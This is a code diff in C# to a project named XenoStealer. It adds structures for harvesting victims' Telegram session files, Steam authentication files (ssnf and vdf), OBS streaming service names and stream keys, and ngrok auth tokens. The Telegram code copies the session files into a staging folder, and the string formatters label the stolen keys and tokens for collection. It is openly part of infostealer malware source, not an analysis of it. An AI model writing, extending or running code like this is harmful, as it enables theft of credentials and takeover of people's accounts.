@@ -1,14 +1,107 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using static XenoStealer.DataExtractionStructs;
 
 namespace XenoStealer
 {
     public static class DataExtractionStructs
     {
+        public struct TelegramInfo 
+        { 
+            public static string rootPath;
+            public static string[] files;
+            public TelegramInfo(string _rootPath, string[] _files) 
+            {
+                rootPath = _rootPath;
+                files = _files;
+            }
+            public void CopyTo(string path) 
+            {
+                foreach (string file in files)
+                {
+                    try
+                    {
+                        string relativePath = file.Substring(rootPath.Length + 1);
+
+                        string destinationFilePath = Path.Combine(path, relativePath);
+
+                        string destinationDirectory = Path.GetDirectoryName(destinationFilePath);
+                        if (!Directory.Exists(destinationDirectory))
+                        {
+                            Directory.CreateDirectory(destinationDirectory);
+                        }
+
+                        Utils.ForceCopy(file, destinationFilePath);
+                    }
+                    catch 
+                    {
+                        continue;
+                    }
+                }
+            }
+        }
+
+        public struct SteamInfo
+        {
+            public string[] games;
+            public string[] ssnfFiles;
+            public string[] vdfFiles;
+
+            public SteamInfo(string[] _games, string[] _ssnfFiles, string[] _vdfFiles)
+            {
+                games = _games;
+                ssnfFiles = _ssnfFiles;
+                vdfFiles = _vdfFiles;
+            }
+
+            public override string ToString()
+            {
+                string result = "";
+                foreach (string i in games) 
+                {
+                    result += i;
+                    result += Environment.NewLine;
+                }
+
+                return result;
+            }
+        }
+
+
+        public struct OBSInfo
+        {
+            public string service;
+            public string streamKey;
+            public OBSInfo(string _service, string _streamKey)
+            {
+                service = _service;
+                streamKey = _streamKey;
+            }
+
+            public override string ToString()
+            {
+                string result = "SERVICE: " + service;
+                result += Environment.NewLine;
+                result += "STREAM KEY: " + streamKey;
+                return result;
+            }
+        }
+
+        public struct NgrokInfo 
+        {
+            public string authToken;
+            public NgrokInfo(string _authToken) 
+            {
+                authToken = _authToken;
+            }
+            public override string ToString()
+            {
+                return "AUTHTOKEN: " + authToken;
+            }
+        }
 
         public struct WinScpInfo 
         {
